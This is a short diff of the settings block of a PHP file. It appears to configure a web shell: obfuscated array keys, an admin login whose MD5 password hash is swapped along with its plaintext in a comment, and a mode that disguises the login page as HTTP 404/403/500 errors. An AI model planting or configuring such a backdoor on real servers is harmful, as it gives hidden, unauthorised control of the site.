@@ -1,7 +1,7 @@
 <?php
 $GLOBALS['NeUSMyPGXP'] = array(
 	'usmfzmlHFCje' => 'admin',//login username
-	'paLDRhHfAovu' => 'a6f452ec3293d7fb72c5b677257b20ec',//login password (MD5)... ehsan
+	'paLDRhHfAovu' => '0c2b42475a9d2965559d2bd9f9085ccf',//login password (MD5)... bosskubabi89
 	'saEuEgnDlHuL' => '1',//safe mode.. 0 = allow, 1 = deny
 	'logXKTfQPNcx' => 'gui',//safe mode type.. gui = login and HTTP errors accepted: 500, 404, 403
 	'shiJVQhUrFkw' => '1',//show icons.. 0 = not show, 1 = show
